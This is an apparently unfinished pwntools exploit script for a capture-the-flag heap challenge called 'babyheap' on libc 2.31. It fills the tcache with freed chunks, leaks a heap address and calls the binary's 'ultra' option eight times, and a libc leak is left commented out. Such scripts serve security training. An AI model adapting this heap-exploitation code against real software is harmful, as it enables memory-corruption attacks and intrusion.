#!/usr/bin/python3

from pwn import *
import sys

#HOST = 'eofqual.zoolab.org'
HOST = 'localhost'
PORT = 10101
BIN = './babyheap'
LIBC = '../libc-2.31.so'

e = ELF(BIN)
l = ELF(LIBC)

if len(sys.argv) > 1:
    r = remote(HOST, PORT)
else:
    r = process(BIN, env={"LD_PRELOAD": LIBC})

def ch(i):
    r.sendafter('choice : ', str(i))

def add(size, data):
    ch('C')
    r.sendlineafter("Size : ", str(size))
    r.sendlineafter("Data : ", data)
 
def edit(data):
    ch('E')
    r.sendlineafter("Data : ", data)
 
def delete():
    ch('D')
 
def show():
    ch('S')

def ultra(data):
    ch('U')
    r.sendlineafter("Data : ", data)

for _ in range(7):
    add(0x280, 'Q') # 1~7
    delete() # 1~7
show() # 1
heap = u64(r.recv(6) + b'\x00'*2) - 0x2f90
log.info(f'heap: {hex(heap)}')
add(0x280, 'Q') # 8

delete() # 8
ultra('W')
ultra('W')
ultra('W')
ultra('W')
ultra('W')
ultra('W')
ultra('W')
ultra('W')




#show() # 2
#libc = u64(r.recv(6) + b'\x00'*2) - 0x1ebbe0
#log.info(f'libc: {hex(libc)}')
r.interactive()
